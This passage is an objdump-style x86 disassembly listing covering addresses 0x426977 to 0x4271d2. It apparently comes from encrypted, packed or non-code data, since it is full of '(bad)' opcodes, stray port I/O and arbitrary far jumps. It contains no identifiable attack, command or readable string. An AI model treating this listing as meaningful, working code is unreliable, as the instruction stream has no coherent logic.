  426977:	mov    ah,0xda
  426979:	div    edi
  42697b:	aad    0xd6
  42697d:	repz mov cl,0x1
  426980:	icebp  
  426981:	cmc    
  426982:	add    bh,al
  426984:	loopne 0x426943
  426986:	add    edi,eax
  426988:	cli    
  426989:	add    eax,esp
  42698b:	cld    
  42698c:	or     ah,cl
  42698e:	fadd   st(0),st
  426990:	shl    DWORD PTR [ecx-0x29544142],0xec
  426997:	mov    esi,0xeed4b6ca
  42699d:	leave  
  42699e:	sar    BYTE PTR [ebp-0x3e1e313d],cl
  4269a4:	neg    dl
  4269a6:	add    edi,ebp
  4269a8:	loope  0x426981
  4269aa:	(bad)  
  4269ab:	out    0xde,eax
  4269ad:	fisttp QWORD PTR [eax]
  4269af:	or     DWORD PTR [edi-0x2a4d1a11],esp
  4269b5:	mov    bl,0xd1
  4269b7:	mov    al,0xf1
  4269b9:	sti    
  4269ba:	jmp    0xdcd1:0xf7d5f7e8
  4269c1:	mov    ebp,0x5f5f8f8
  4269c6:	(bad)  
  4269c7:	mov    esp,0xdcf4fbdb
  4269cc:	fucomip st,st(0)
  4269ce:	shr    ebp,0xe9
  4269d1:	mov    bl,0xd3
  4269d3:	mov    dl,0xd2
  4269d5:	ret    
  4269d6:	mov    dh,0xea
  4269d8:	int3   
  4269d9:	rol    bh,1
  4269db:	fcomp  st(4)
  4269dd:	call   0xf745449e
  4269e2:	pop    es
  4269e3:	add    cl,al
  4269e5:	rcl    ebx,cl
  4269e7:	jmp    0x4269b0
  4269e9:	out    dx,eax
  4269ea:	xlat   BYTE PTR ds:[ebx]
  4269eb:	or     al,ch
  4269ed:	stc    
  4269ee:	loop   0x4269c9
  4269f0:	fmul   st(2),st
  4269f2:	mov    esi,0xd4fbc0f5
  4269f7:	lods   al,BYTE PTR ds:[esi]
  4269f8:	in     al,dx
  4269f9:	mov    dl,0xc4
  4269fb:	shl    bl,cl
  4269fd:	retf   0xfaf0
  426a00:	shr    dh,1
  426a02:	fucomip st,st(5)
  426a04:	shl    ecx,0xe4
  426a07:	out    0xd7,al
  426a09:	add    dh,ah
  426a0b:	jmp    0xdf3b52d7
  426a10:	out    dx,eax
  426a11:	out    dx,al
  426a12:	mov    edi,0xd2f6afad
  426a17:	rcr    ecx,cl
  426a19:	mov    edx,0xb8b4f4ee
  426a1e:	mov    ebx,0xb8f2f4f2
  426a23:	lock test ah,0xe4
  426a27:	add    eax,0xc9dce1dc
  426a2c:	out    0xe8,al
  426a2e:	or     al,0xdf
  426a30:	lods   eax,DWORD PTR ds:[esi]
  426a31:	retf   0xf7a8
  426a34:	aad    0xaa
  426a36:	int3   
  426a37:	rcr    cl,cl
  426a39:	rcr    eax,1
  426a3b:	mov    al,0xef
  426a3d:	into   
  426a3e:	shl    ch,1
  426a40:	aad    0xfc
  426a42:	(bad)  
  426a44:	shl    dh,1
  426a46:	or     ecx,DWORD PTR [ebx]
  426a48:	cli    
  426a49:	pxor   mm0,mm5
  426a4c:	cli    
  426a4d:	in     eax,dx
  426a4e:	or     BYTE PTR [ecx],al
  426a50:	enter  0xd0e5,0xd5
  426a54:	(bad)  
  426a55:	div    DWORD PTR [edi-0x353f190a]
  426a5b:	jmp    0xf9356930
  426a60:	loopne 0x426a1f
  426a62:	rol    esi,cl
  426a64:	lock aam 0x1
  426a67:	out    0xd1,eax
  426a69:	or     edx,ecx
  426a6b:	loope  0x426a75
  426a6d:	repz or DWORD PTR [edi],ecx
  426a70:	into   
  426a71:	scas   al,BYTE PTR es:[edi]
  426a72:	xlat   BYTE PTR ds:[ebx]
  426a73:	test   al,0xe7
  426a75:	in     eax,0xdb
  426a77:	mul    ecx
  426a79:	jmp    0xda0d2a58
  426a7e:	ret    
  426a7f:	hlt    
  426a80:	mov    eax,0xd4e0d1cc
  426a85:	mov    esi,0xfdbd8fd
  426a8a:	stc    
  426a8b:	fdivr  st(5),st
  426a8d:	or     esp,ebx
  426a8f:	retf   
  426a90:	jmp    0xde2c2d4d
  426a95:	aad    0xe3
  426a97:	jmp    0x426a54
  426a99:	jmp    0xd1be:0xecefc9b1
  426aa0:	mov    esp,0xddbdf5c3
  426aa5:	sar    DWORD PTR [ebp-0x3415f723],cl
  426aab:	or     ebp,edi
  426aad:	pop    es
  426aae:	in     eax,dx
  426aaf:	add    eax,0xf2c0e2ee
  426ab4:	mov    bh,0xe8
  426ab6:	xlat   BYTE PTR ds:[ebx]
  426ab7:	mov    ch,0xf6
  426ab9:	xlat   BYTE PTR ds:[ebx]
  426aba:	aam    0xd4
  426abc:	std    
  426abd:	in     al,dx
  426abe:	clc    
  426abf:	ror    eax,cl
  426ac1:	loopne 0x426ab5
  426ac3:	mov    ch,0xbd
  426ac6:	loope  0x426a99
  426ac8:	hlt    
  426ac9:	mov    edi,0xe908efc9
  426acf:	stc    
  426ad0:	loopne 0x426ab4
  426ad2:	ror    ebx,0xee
  426ad5:	in     al,0xf2
  426ad7:	test   al,0xe6
  426ad9:	iret   
  426ada:	mov    cl,0xfb
  426adc:	(bad)  
  426add:	jmp    0x426a9d
  426adf:	jmp    0xee004b9f
  426ae4:	out    0xf9,al
  426ae6:	out    0xea,eax
  426ae8:	stc    
  426ae9:	rol    eax,0x7
  426aec:	in     al,dx
  426aed:	(bad)  
  426aee:	out    dx,al
  426aef:	cld    
  426af0:	int3   
  426af1:	iret   
  426af2:	shl    BYTE PTR [esi-0x1233323e],1
  426af8:	leave  
  426af9:	repnz cmc 
  426afb:	aad    0xb7
  426afd:	retf   
  426afe:	(bad)  
  426aff:	call   0xfd014501
  426b04:	in     eax,0xf5
  426b06:	out    0xf0,al
  426b08:	or     edx,edi
  426b0a:	cmc    
  426b0b:	loopne 0x426adc
  426b0d:	cld    
  426b0e:	dec    DWORD PTR [eax]
  426b10:	mov    bl,0xc2
  426b12:	xlat   BYTE PTR ds:[ebx]
  426b13:	repz test ecx,0xcfcee8c2
  426b1a:	icebp  
  426b1b:	lds    edi,FWORD PTR [eax-0x11400d44]
  426b21:	in     al,dx
  426b22:	repz add ebx,esi
  426b25:	lock aad 0xf5
  426b28:	add    al,0xc4
  426b2a:	fcmovb st,st(4)
  426b2c:	clc    
  426b2d:	or     esi,ecx
  426b2f:	retf   0xb3ca
  426b32:	in     al,dx
  426b33:	rcl    edi,cl
  426b35:	in     al,dx
  426b36:	ror    ch,cl
  426b38:	out    0xda,eax
  426b3a:	mov    eax,0xfcfcb9c9
  426b3f:	loop   0x426b03
  426b41:	repnz rol al,1
  426b44:	out    0xe3,eax
  426b46:	pop    es
  426b47:	jecxz  0x426b4a
  426b49:	jmp    0x72a730b
  426b4e:	cli    
  426b4f:	into   
  426b50:	jmp    0xc107501a
  426b55:	repz mov al,0xd3
  426b58:	in     al,0xf4
  426b5a:	mov    dh,0xf5
  426b5c:	mov    ecx,0xccf0cbb6
  426b61:	fistp  QWORD PTR [edx+eiz*8-0x151e00fd]
  426b68:	sar    edi,1
  426b6a:	or     eax,ebp
  426b6c:	out    dx,eax
  426b6d:	into   
  426b6e:	loope  0x426b6f
  426b70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b71:	lods   eax,DWORD PTR ds:[esi]
  426b72:	enter  0xeaf1,0xe0
  426b76:	loopne 0x426b69
  426b78:	lock sar cl,1
  426b7b:	xlat   BYTE PTR ds:[ebx]
  426b7c:	mov    esi,0xd8d2febc
  426b81:	loope  0x426b7a
  426b83:	out    0x5,eax
  426b85:	push   es
  426b86:	fadd   st(0),st
  426b88:	(bad)  
  426b89:	(bad)  
  426b8b:	clc    
  426b8c:	jmp    0xb3c8:0xd8dce4fb
  426b93:	mov    esp,0xe7c8f7c4
  426b98:	retf   
  426b99:	fcmovne st,st(0)
  426b9b:	aad    0xe8
  426b9d:	mov    edx,0xe2e3edd1
  426ba2:	mov    ch,0xe0
  426ba4:	mov    ebp,0xc1df0bd6
  426ba9:	fiadd  WORD PTR [eax]
  426bab:	test   BYTE PTR ds:0xc10be100,0xbe
  426bb2:	out    0xbd,al
  426bb4:	mov    ebp,0xb9b4ebd6
  426bb9:	repz in eax,0xe8
  426bbc:	jmp    0xe306489c
  426bc1:	sar    DWORD PTR [edx+eax*1+0xd2dccd],1
  426bc8:	icebp  
  426bc9:	add    esi,ebx
  426bcb:	or     eax,0xebfa05cf
  426bd0:	rcl    ecx,1
  426bd2:	shl    esi,cl
  426bd4:	in     al,dx
  426bd5:	sti    
  426bd6:	(bad)  
  426bd7:	shl    BYTE PTR [eax-0x2c102108],1
  426bdd:	out    dx,al
  426bde:	ret    
  426bdf:	mov    edi,0xf4b9c2fb
  426be4:	neg    ch
  426be6:	shl    esi,1
  426be8:	xlat   BYTE PTR ds:[ebx]
  426be9:	xlat   BYTE PTR ds:[ebx]
  426bea:	fneni(8087 only) 
  426bec:	loop   0x426bb6
  426bee:	iret   
  426bef:	loop   0x426be2
  426bf1:	fucomip st,st(6)
  426bf3:	(bad)  
  426bf4:	shl    edx,1
  426bf6:	loopne 0x426bb2
  426bf8:	call   0xea015aea
  426bfd:	fdivr  st,st(5)
  426bff:	fcomi  st,st(2)
  426c01:	fdivr  st(4),st
  426c03:	fsubrp st(2),st
  426c05:	or     ebx,edx
  426c07:	imul   bl
  426c09:	rol    BYTE PTR [edx],0xdb
  426c0c:	(bad)  
  426c0d:	(bad)  
  426c0f:	out    dx,al
  426c10:	in     eax,dx
  426c11:	fucom  st(4)
  426c13:	out    0xd5,al
  426c15:	lods   eax,DWORD PTR ds:[esi]
  426c16:	repnz mov cl,0xd0
  426c19:	leave  
  426c1a:	mov    edx,0xbefececf
  426c1f:	clc    
  426c20:	fdiv   st(5),st
  426c22:	mov    ecx,0xe1c5e3cc
  426c27:	or     esp,ebx
  426c29:	loop   0x426c03
  426c2b:	or     ah,bl
  426c2d:	out    dx,eax
  426c2e:	add    ah,cl
  426c30:	(bad)
  426c33:	mov    esi,0xcafbcdc7
  426c38:	loopne 0x426bea
  426c3a:	in     al,0xff
  426c3c:	lock retf 0xd8f3
  426c40:	add    esp,edi
  426c42:	fnstcw WORD PTR [ebp-0xe182c29]
  426c48:	aad    0xf5
  426c4a:	sar    ch,0xda
  426c4d:	jmp    0xf4306c3f
  426c52:	test   al,0xb6
  426c54:	cmc    
  426c55:	cmc    
  426c56:	lods   al,BYTE PTR ds:[esi]
  426c57:	fcmovu st,st(1)
  426c59:	mov    ecx,0xcce9cbb6
  426c5e:	mov    edx,0xc1f5f401
  426c63:	loopne 0x426c27
  426c65:	mov    esp,0xdfc2f2fc
  426c6a:	pop    es
  426c6b:	fdivp  st(3),st
  426c6d:	int    0xcb
  426c6f:	bnd ret 0xf1b2
  426c73:	shr    al,cl
  426c75:	hlt    
  426c76:	mov    bh,0xb1
  426c78:	rol    ch,0xfe
  426c7b:	retf   0xcfb6
  426c7e:	std    
  426c7f:	mov    esp,0xdcb8e8e9
  426c84:	in     eax,dx
  426c85:	loopne 0x426c7f
  426c87:	rol    DWORD PTR ds:0xf8e80fe6,0xe4
  426c8e:	call   0xc0301b81
  426c93:	jmp    0x426c87
  426c95:	jmp    0xb11b324c
  426c9a:	xlat   BYTE PTR ds:[ebx]
  426c9b:	fucomi st,st(7)
  426c9d:	jmp    0x426c7e
  426c9f:	lock fidivr DWORD PTR [eax-0x2a3d0810]
  426ca6:	fcom   st(5)
  426ca8:	mov    BYTE PTR [eax],0xde
  426cab:	hlt    
  426cac:	fld    DWORD PTR [eax]
  426cae:	(bad)  
  426cb0:	mov    dl,0xa8
  426cb2:	(bad)  
  426cb3:	mov    esp,0xbbead3cc
  426cb8:	hlt    
  426cb9:	enter  0xc4f6,0xff
  426cbd:	retf   0xb9d7
  426cc0:	loope  0x426cbe
  426cc2:	mov    esi,0x7d0d1c0
  426cc7:	loope  0x426caf
  426cc9:	lock out dx,eax
  426ccb:	leave  
  426ccc:	pop    es
  426ccd:	fnsetpm(287 only) 
  426ccf:	push   cs
  426cd0:	call   0xee2531ac
  426cd5:	shr    ah,cl
  426cd7:	mov    al,0xf0
  426cd9:	out    0xee,al
  426cdb:	clc    
  426cdc:	int    0xf4
  426cde:	leave  
  426cdf:	call   0xfb1167d5
  426ce4:	push   es
  426ce5:	loope  0x426cdd
  426ce7:	test   DWORD PTR [ebx],0x508d904
  426ced:	add    eax,0xf1ecccfb
  426cf2:	rcr    esi,cl
  426cf4:	mov    dl,0xea
  426cf6:	into   
  426cf7:	leave  
  426cf8:	fsubr  st,st(0)
  426cfa:	cmc    
  426cfb:	repnz not esp
  426cfe:	dec    ch
  426d00:	imul   al
  426d02:	iret   
  426d03:	repnz in al,0xf2
  426d06:	jmp    0x426d09
  426d08:	add    dl,bh
  426d0a:	add    al,0x9
  426d0c:	fdivr  st,st(5)
  426d0e:	repnz shr ch,0xbe
  426d12:	fst    st(1)
  426d14:	mov    al,0xc7
  426d16:	cli    
  426d17:	mov    dh,0xd3
  426d19:	scas   al,BYTE PTR es:[edi]
  426d1a:	iret   
  426d1b:	(bad)  
  426d1c:	fcomi  st,st(1)
  426d1e:	cli    
  426d1f:	(bad)  
  426d20:	xlat   BYTE PTR ds:[ebx]
  426d21:	int3   
  426d22:	cli    
  426d23:	fadd   QWORD PTR [esi]
  426d25:	in     eax,0xdf
  426d27:	fild   DWORD PTR [edi]
  426d29:	fcmove st,st(7)
  426d2b:	cli    
  426d2c:	hlt    
  426d2d:	add    ebx,ecx
  426d2f:	dec    esi
  426d31:	jmp    0xc1e4:0xd3ade4f7
  426d38:	cli    
  426d39:	mov    eax,0xcbf2beee
  426d3e:	int3   
  426d3f:	add    edi,edx
  426d41:	test   DWORD PTR [eax],0xdec0c1c3
  426d47:	std    
  426d48:	push   eax
  426d4a:	loope  0x426d42
  426d4c:	add    al,0xe6
  426d4e:	enter  0xccf2,0xa8
  426d52:	int    0xcb
  426d54:	out    dx,al
  426d55:	shl    edi,0xfb
  426d58:	rcl    bl,cl
  426d5a:	repnz enter 0xd6f0,0xef
  426d5f:	imul   ah
  426d61:	div    esi
  426d63:	mov    ebp,0xe1dbd8fe
  426d68:	test   ebx,0xf9caf809
  426d6e:	push   cs
  426d6f:	add    esp,ebx
  426d71:	int    0xf0
  426d73:	aad    0xe1
  426d75:	in     eax,dx
  426d76:	shl    dh,1
  426d78:	out    dx,al
  426d79:	retf   0xdab4
  426d7c:	(bad)  
  426d7e:	stc    
  426d7f:	icebp  
  426d80:	bnd ret 0xbf07
  426d84:	in     eax,0xe3
  426d86:	or     edx,ecx
  426d88:	add    bl,dl
  426d8a:	aam    0xd9
  426d8c:	hlt    
  426d8d:	out    0x8,eax
  426d8f:	retf   0xecd3
  426d92:	out    0xe5,eax
  426d94:	ret    
  426d95:	out    0xc6,eax
  426d97:	icebp  
  426d98:	fcmovnb st,st(6)
  426d9a:	xlat   BYTE PTR ds:[ebx]
  426d9b:	fdivr  st,st(1)
  426d9d:	mov    eax,0xdefbb4b4
  426da2:	rol    dl,0xda
  426da5:	rcr    esi,cl
  426da7:	lock rcr dh,0xd4
  426dab:	hlt    
  426dac:	jecxz  0x426db0
  426dae:	paddw  mm7,QWORD PTR [ecx-0x2b3a1156]
  426db5:	mul    bl
  426db7:	cli    
  426db8:	stc    
  426db9:	retf   0xdefb
  426dbc:	into   
  426dbd:	repnz (bad) 
  426dc0:	mul    ecx
  426dc2:	out    dx,al
  426dc3:	into   
  426dc4:	int3   
  426dc5:	(bad)  
  426dc6:	out    0xde,al
  426dc8:	in     al,0xa
  426dca:	inc    ah
  426dcc:	aad    0xfc
  426dce:	fcmovu st,st(7)
  426dd0:	(bad)  
  426dd1:	call   0xb81a43c3
  426dd6:	jmp    0xfcf9:0xadf3e6d7
  426ddd:	mov    ch,0xd0
  426ddf:	xlat   BYTE PTR ds:[ebx]
  426de0:	cmc    
  426de1:	fcomi  st,st(0)
  426de3:	add    bl,bh
  426de5:	ffreep st(6)
  426de7:	jmp    0x426dc2
  426de9:	add    BYTE PTR [eax],al
  426deb:	retf   0x3d4
  426dee:	(bad)  
  426def:	fmul   st,st(1)
  426df1:	(bad)  
  426df2:	loopne 0x426dc2
  426df4:	icebp  
  426df5:	into   
  426df6:	mov    dl,0xd6
  426df8:	sti    
  426df9:	fcomip st,st(0)
  426dfb:	fldln2 
  426dfd:	mov    ebp,0xd5ccfbe9
  426e02:	into   
  426e03:	(bad)  
  426e04:	add    esi,eax
  426e06:	lds    eax,FWORD PTR ds:0x6f5d0fa
  426e0c:	int    0xcc
  426e0e:	or     bl,ah
  426e10:	shr    ch,1
  426e12:	imul   al
  426e14:	icebp  
  426e15:	loopne 0x426e12
  426e17:	retf   0xe0ed
  426e1a:	clc    
  426e1b:	(bad)  
  426e1c:	in     eax,dx
  426e1d:	mov    edi,0xd7ccc2e2
  426e22:	mov    edi,0xd6e2d5d3
  426e27:	in     al,0xea
  426e29:	retf   0xe2fb
  426e2c:	fucomp st(7)
  426e2e:	fadd   st(0),st
  426e30:	shr    DWORD PTR [ecx-0x493b1a16],0xc2
  426e37:	cli    
  426e38:	in     al,dx
  426e39:	bnd call 0xce1a4b39
  426e3f:	add    dl,al
  426e41:	rcl    eax,1
  426e43:	cld    
  426e44:	sti    
  426e45:	int3   
  426e46:	retf   
  426e47:	aam    0x8
  426e49:	test   BYTE PTR [ebx],0xf9
  426e4c:	(bad)
  426e4f:	clc    
  426e50:	fmulp  st(2),st
  426e52:	(bad)  
  426e53:	rcr    esp,cl
  426e55:	xlat   BYTE PTR ds:[ebx]
  426e56:	loop   0x426e31
  426e58:	int    0xba
  426e5a:	int    0xd1
  426e5c:	fmulp  st(0),st
  426e5e:	(bad)  
  426e5f:	iret   
  426e60:	(bad)  
  426e61:	xlat   BYTE PTR ds:[ebx]
  426e62:	fld    QWORD PTR [esi]
  426e64:	shl    edi,cl
  426e66:	retf   
  426e67:	out    0xe6,eax
  426e69:	out    dx,eax
  426e6a:	call   0xfa206364
  426e6f:	into   
  426e70:	into   
  426e71:	loope  0x426e43
  426e73:	scas   al,BYTE PTR es:[edi]
  426e74:	xlat   BYTE PTR ds:[ebx]
  426e75:	xlat   BYTE PTR ds:[ebx]
  426e76:	(bad)  
  426e77:	test   al,0xd2
  426e79:	aad    0xd6
  426e7b:	rol    esp,cl
  426e7d:	jecxz  0x426e4f
  426e7f:	int    0xff
  426e81:	std    
  426e82:	sti    
  426e83:	rcr    edi,0xd6
  426e86:	clc    
  426e87:	cld    
  426e88:	leave  
  426e89:	stc    
  426e8a:	enter  0xd06,0xed
  426e8e:	fsubr  st(7),st
  426e90:	rcl    dl,1
  426e92:	leave  
  426e93:	iret   
  426e94:	hlt    
  426e95:	mov    bl,0xc9
  426e97:	out    dx,al
  426e98:	mov    cl,0xd5
  426e9a:	(bad)  
  426e9b:	div    BYTE PTR [edi-0x251e1727]
  426ea1:	fstp   TBYTE PTR [eax-0x6fe1e3a]
  426ea7:	stc    
  426ea8:	call   0xf9226578
  426ead:	add    dh,dl
  426eaf:	in     eax,dx
  426eb0:	loopne 0x426e81
  426eb2:	jecxz  0x426e7c
  426eb4:	(bad)  
  426eb5:	repnz int 0xdb
  426eb8:	rcl    ebx,cl
  426eba:	(bad)  
  426ebb:	enter  0xf7f3,0xd6
  426ebf:	(bad)  
  426ec0:	mov    ecx,0xf5e5e2fd
  426ec5:	cld    
  426ec6:	(bad)  
  426ec7:	aam    0x6
  426ec9:	or     ebx,ebp
  426ecb:	or     eax,0x5e60ce4
  426ed0:	into   
  426ed1:	leave  
  426ed2:	jmp    0xed33229b
  426ed7:	loopne 0x426ebe
  426ed9:	aam    0xf6
  426edb:	in     al,dx
  426edc:	leave  
  426edd:	mov    ebx,0xe1b0f3
  426ee2:	iret   
  426ee3:	sti    
  426ee4:	(bad)  
  426ee5:	cld    
  426ee6:	fsub   st(1),st
  426ee8:	mul    esp
  426eea:	or     ch,bh
  426eec:	dec    BYTE PTR [ecx]
  426eee:	in     al,0xde
  426ef0:	jecxz  0x426ea5
  426ef2:	fsubr  st(4),st
  426ef4:	(bad)  
  426ef5:	mov    dl,0xcb
  426ef7:	ror    ch,1
  426ef9:	div    al
  426efb:	(bad)  
  426efc:	cmc    
  426efd:	out    dx,eax
  426efe:	ror    ah,1
  426f00:	lock enter 0xfcf0,0x1
  426f05:	push   es
  426f06:	add    eax,0xdefcc4f1
  426f0b:	frndint 
  426f0d:	jmp    0xc7b2:0xbcc4eee1
  426f14:	rol    al,0xb1
  426f17:	retf   
  426f18:	out    dx,eax
  426f19:	out    0xb8,eax
  426f1b:	mov    ecx,0xdaf4c9df
  426f20:	aad    0xf1
  426f22:	sar    BYTE PTR [esi-0x1a3a4324],0x8
  426f29:	sar    esp,0xc9
  426f2c:	or     al,0xe8
  426f2e:	in     eax,0xfc
  426f30:	(bad)  
  426f31:	xlat   BYTE PTR ds:[ebx]
  426f32:	shl    BYTE PTR [eax-0x3d1e353d],0xb6
  426f39:	call   0xf92f6206
  426f3e:	sar    eax,1
  426f40:	fdiv   st(7),st
  426f42:	xlat   BYTE PTR ds:[ebx]
  426f43:	in     eax,0xf8
  426f45:	fimul  DWORD PTR [edx]
  426f47:	jecxz  0x426f10
  426f49:	fsubp  st(6),st
  426f4b:	add    DWORD PTR [eax],eax
  426f4d:	fld    DWORD PTR [edx]
  426f4f:	fcmovu st,st(1)
  426f51:	enter  0xdcc5,0xaf
  426f55:	shl    edi,cl
  426f57:	loop   0x426f45
  426f59:	mov    al,0xe6
  426f5b:	out    0xd1,al
  426f5d:	mov    eax,0xf3cdf4fc
  426f62:	icebp  
  426f63:	loope  0x426f56
  426f65:	(bad)  
  426f66:	out    0xc3,al
  426f68:	add    bh,cl
  426f6a:	stc    
  426f6b:	std    
  426f6c:	out    0xd9,al
  426f6e:	out    0xe8,eax
  426f70:	lods   eax,DWORD PTR ds:[esi]
  426f71:	ret    
  426f72:	fisub  WORD PTR [ebp+esi*8-0x3b28143a]
  426f79:	mov    edx,0xb5ecc6c8
  426f7e:	clc    
  426f7f:	fdivr  QWORD PTR [eax-0x3a472527]
  426f85:	out    0xdd,eax
  426f87:	repnz add esp,esi
  426f8a:	retf   0xce7
  426f8d:	std    
  426f8e:	(bad)  
  426f90:	ret    
  426f91:	rcl    al,cl
  426f93:	lock call 0xd0084055
  426f99:	in     al,0xb7
  426f9b:	ror    ecx,1
  426f9d:	retf   0xcace
  426fa0:	sti    
  426fa1:	ret    
  426fa2:	aam    0xdc
  426fa4:	add    eax,0xd0d6e3c7
  426fa9:	out    dx,eax
  426faa:	fild   DWORD PTR ds:0xfadefc
  426fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fb1:	(bad)  
  426fb2:	fsubp  st(6),st
  426fb4:	mov    al,0xef
  426fb6:	out    0xd0,al
  426fb8:	mov    ebx,0xe8e4cccd
  426fbd:	mov    ah,0xcb
  426fbf:	(bad)  
  426fc1:	fcmovne st,st(4)
  426fc3:	add    eax,0xe4c4fdbe
  426fc8:	ret    0xe9e8
  426fcb:	push   cs
  426fcc:	jmp    0xf1443496
  426fd1:	shr    BYTE PTR [edi-0x2f4e5423],0xdb
  426fd8:	aad    0xd0
  426fda:	aam    0xb8
  426fdc:	shl    esi,1
  426fde:	fcmovne st,st(0)
  426fe0:	xlat   BYTE PTR ds:[ebx]
  426fe1:	in     al,dx
  426fe2:	loop   0x426fe9
  426fe4:	(bad)  
  426fe6:	fabs   
  426fe8:	loope  0x426fd0
  426fea:	hlt    
  426feb:	leave  
  426fec:	loopne 0x426ff3
  426fee:	(bad)  
  426ff0:	call   0xcd2f56bc
  426ff5:	iret   
  426ff6:	ret    0xd6da
  426ff9:	(bad)  
  426ffa:	out    dx,al
  426ffb:	repz mov ebp,0xdbb903ea
  427001:	shl    bl,cl
  427003:	repnz aad 0xe5
  427006:	aad    0xf2
  427008:	lock retf 0x90b
  42700c:	leave  
  42700d:	in     al,dx
  42700e:	int    0xe6
  427010:	jmp    0x426fda
  427012:	mov    edi,0xcbc4f4f7
  427017:	into   
  427018:	iret   
  427019:	icebp  
  42701a:	push   edi
  42701c:	mov    esi,0x3c2cdda
  427021:	in     eax,dx
  427022:	mov    DWORD PTR [ebx],0xe0f3e602
  427028:	aam    0x8
  42702a:	jmp    0x427007
  42702c:	fpatan 
  42702e:	std    
  42702f:	add    al,dl
  427031:	lods   al,BYTE PTR ds:[esi]
  427032:	int3   
  427033:	mov    esp,0xeab1d3c8
  427038:	jmp    0xebf0:0xf2f7e4ed
  42703f:	retf   0x1f0
  427042:	ret    0xfaff
  427045:	fcmovbe st,st(0)
  427047:	push   es
  427048:	(bad)  
  427049:	mov    esi,0xcac5d5f5
  42704e:	push   es
  42704f:	in     al,0xb1
  427051:	stos   BYTE PTR es:[edi],al
  427052:	scas   eax,DWORD PTR es:[edi]
  427053:	repnz mov dl,0xd4
  427056:	aam    0xfa
  427058:	(bad)  
  427059:	mov    ebx,0xf8feebf2
  42705e:	call   0xbe144544
  427063:	in     eax,0xd1
  427065:	shl    edi,cl
  427067:	loope  0x427033
  427069:	in     eax,0xe6
  42706b:	pop    es
  42706c:	add    bl,ah
  42706e:	in     eax,dx
  42706f:	call   0xc5102f4d
  427074:	lods   eax,DWORD PTR ds:[esi]
  427075:	cmc    
  427076:	shr    BYTE PTR [eax-0x17162f3c],0xf5
  42707d:	cld    
  42707e:	lock stc 
  427080:	mov    bh,0xfd
  427082:	sti    
  427083:	(bad)  
  427085:	push   es
  427086:	retf   
  427087:	ret    0xc505
  42708a:	pand   mm1,mm5
  42708d:	fucomi st,st(7)
  42708f:	(bad)  
  427091:	test   eax,0xf2bcb2b7
  427097:	int    0xee
  427099:	iret   
  42709a:	(bad)  
  42709b:	jmp    0x42707a
  42709d:	(bad)  
  42709f:	add    bl,al
  4270a1:	rcl    cl,1
  4270a3:	aam    0xbc
  4270a5:	out    0xdb,al
  4270a7:	jecxz  0x42708a
  4270a9:	retf   0xf605
  4270ac:	les    ecx,FWORD PTR [ebx]
  4270ae:	retf   0xc5fe
  4270b1:	mov    eax,0xe5f3cbf1
  4270b6:	lods   eax,DWORD PTR ds:[esi]
  4270b7:	repnz jmp 0xfdcc:0xbaecfaf6
  4270bf:	jmp    0xf14558be
  4270c4:	add    edx,esp
  4270c6:	hlt    
  4270c7:	inc    esp
  4270c9:	shl    dh,1
  4270cb:	add    ah,dl
  4270cd:	fcompp 
  4270cf:	pop    es
  4270d0:	jecxz  0x4270bb
  4270d2:	shr    BYTE PTR [edi-0x2c1e2d31],cl
  4270d8:	out    dx,al
  4270d9:	int3   
  4270da:	out    dx,eax
  4270db:	jmp    0xdfbe:0xbb03cafa
  4270e2:	push   es
  4270e3:	push   es
  4270e4:	aad    0xc1
  4270e6:	rcr    ch,cl
  4270e8:	add    bl,al
  4270ea:	(bad)  
  4270ec:	fucomp st(0)
  4270ee:	or     al,BYTE PTR [ebx]
  4270f0:	int    0xdf
  4270f2:	mov    bh,0xe7
  4270f4:	int3   
  4270f5:	ret    0xd2f7
  4270f8:	cmc    
  4270f9:	loopne 0x4270ba
  4270fb:	mov    ecx,0xc3f4e4ff
  427100:	(bad)  
  427101:	clc    
  427102:	repnz (bad) 
  427105:	fst    st(5)
  427107:	pop    es
  427108:	fadd   QWORD PTR [edi]
  42710a:	loopne 0x4270e7
  42710c:	in     eax,0xce
  42710e:	add    BYTE PTR [ecx],al
  427110:	repnz scas eax,DWORD PTR es:[edi]
  427112:	jecxz  0x4270fd
  427114:	shl    esi,cl
  427116:	retf   0xe0b1
  427119:	jmp    0xbfdb:0xcdc5f3d0
  427120:	shr    ch,cl
  427122:	add    ebp,ebp
  427124:	repz jmp 0x42712c
  427127:	fadd   st,st(0)
  427129:	add    bh,BYTE PTR [ebp-0x35201c15]
  42712f:	cli    
  427130:	int    0xe9
  427132:	out    0xe7,eax
  427134:	hlt    
  427135:	icebp  
  427136:	jmp    0xf1f0:0xebb7b5c4
  42713d:	mov    ch,0xd2
  42713f:	leave  
  427140:	mov    ebp,0xc6cdd0
  427145:	shl    ebp,1
  427147:	in     al,0xc4
  427149:	clc    
  42714a:	pop    es
  42714b:	add    BYTE PTR [esi],cl
  42714d:	repz repz jmp esi
  427151:	ret    
  427152:	jmp    0xf4b1:0xd7ccd6bc
  427159:	shr    eax,1
  42715b:	repnz mov esi,0xcf03bdcd
  427161:	rol    DWORD PTR [ecx],1
  427163:	aad    0xf2
  427165:	or     edi,esi
  427167:	in     al,0xea
  427169:	or     eax,ecx
  42716b:	jmp    0x13165d7e
  427170:	rol    esi,0xcc
  427173:	mov    bh,0xc7
  427175:	jecxz  0x42716d
  427177:	(bad)  
  427178:	hlt    
  427179:	into   
  42717a:	(bad)  
  42717b:	clc    
  42717c:	fstp   TBYTE PTR [edi-0x3f0f1704]
  427182:	(bad)  
  427184:	ret    
  427185:	jmp    0x42717d
  427187:	in     al,0xe3
  427189:	mov    DWORD PTR [ebx],0x4000fe9
  42718f:	repz fmul st(0),st
  427192:	jmp    0xca033e68
  427197:	iret   
  427198:	enter  0xc9e9,0xb4
  42719c:	mov    bh,0xfb
  42719e:	fidiv  DWORD PTR [ebx+edi*4-0x6380624]
  4271a5:	fldpi  
  4271a7:	add    ch,al
  4271a9:	in     eax,0xd5
  4271ab:	add    al,0xcb
  4271ad:	(bad)  
  4271af:	push   cs
  4271b0:	(bad)  
  4271b1:	repz loope 0x427186
  4271b4:	call   0xc20b41a3
  4271b9:	mov    ah,0xf2
  4271bb:	mov    edx,0xd1ddf7d1
  4271c0:	mov    bh,0xbf
  4271c2:	(bad)  
  4271c4:	mov    esi,0xc7d5d2d2
  4271c9:	retf   
  4271ca:	neg    ebp
  4271cc:	in     al,dx
  4271cd:	or     edi,ecx
  4271cf:	out    dx,al
  4271d0:	loope  0x4271a4
  4271d2:	repnz in eax,0xce
